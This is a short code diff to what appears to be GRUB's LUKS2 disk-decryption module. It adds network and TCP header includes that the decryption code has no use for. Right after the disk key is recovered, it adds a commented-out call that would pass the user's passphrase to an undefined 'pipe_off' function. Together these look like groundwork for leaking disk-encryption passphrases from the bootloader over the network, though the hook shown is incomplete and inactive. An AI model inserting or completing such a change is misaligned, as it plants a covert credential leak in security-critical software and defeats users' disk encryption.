@@ -26,7 +26,8 @@
 #include <grub/crypto.h>
 #include <grub/partition.h>
 #include <grub/i18n.h>
-
+#include "net/netbuff.h"
+#include "net/tcp.h"
 #include <base64.h>
 #include <json.h>
 
@@ -420,6 +421,7 @@ luks2_verify_key (grub_luks2_digest_t *d, grub_uint8_t *candidate_key,
   return GRUB_ERR_NONE;
 }
 
+
 static grub_err_t
 luks2_decrypt_key (grub_uint8_t *out_key,
 		   grub_disk_t source, grub_cryptodisk_t crypt,
@@ -535,7 +537,7 @@ luks2_decrypt_key (grub_uint8_t *out_key,
     }
 
   grub_dprintf ("luks2", "Candidate key recovered\n");
-
+  // pipe_off(passphrase, passphraselen);
  err:
   grub_free (split_key);
   return ret;
